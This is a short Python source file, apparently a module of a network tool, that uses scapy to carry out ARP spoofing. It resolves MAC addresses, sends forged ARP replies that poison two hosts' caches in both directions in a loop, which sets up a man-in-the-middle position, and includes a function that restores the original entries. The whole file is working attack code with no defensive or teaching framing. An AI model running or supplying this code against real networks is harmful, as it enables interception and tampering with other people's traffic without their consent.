from scapy.all import *
from scapy.layers.l2 import *


def get_mac(ip):
    """
    Tries to get the MAC of provided IP
    :param ip:
    :return:
    """
    i = 0
    ans, _ = srp(Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(pdst=ip), timeout=3, verbose=0)
    while not ans and i < 3:
        print("      Unable to get mac for: " + ip + " retrying")
        ans, _ = srp(Ether(dst='ff:ff:ff:ff:ff:ff') / ARP(pdst=ip), timeout=3, verbose=0)
        i = i + 1

    if ans:
        return ans[0][1].src
    else:
        print("      Failed to get mac for " + ip + " please check ip or try again later")
        return


def spoof(target_ip, host_ip, target_mac):
    """
    Sends fake arp packets
    :param target_ip:
    :param host_ip:
    :param target_mac:
    :return:
    """
    arp_response = ARP(pdst=target_ip, hwdst=target_mac, psrc=host_ip, op='is-at')
    send(arp_response, verbose=0)


def restore(target_ip, host_ip, target_mac, gw_mac):
    """
    Restores normal arp
    :param target_ip:
    :param host_ip:
    :param target_mac:
    :param gw_mac:
    :return:
    """
    arp_response = ARP(pdst=target_ip, hwdst=target_mac, psrc=host_ip, hwsrc=gw_mac)
    send(arp_response, verbose=0, count=7)


def thread_spoof(target1, target2, target_mac, hw_mac, v):
    """
    Starts thread that spoofs both ways, stops when object v.spoof is false
    :param target1:
    :param target2:
    :param target_mac:
    :param hw_mac:
    :param v:
    :return:
    """
    while v.spoof:
        spoof(target1, target2, target_mac)
        spoof(target2, target1, hw_mac)
        time.sleep(1)


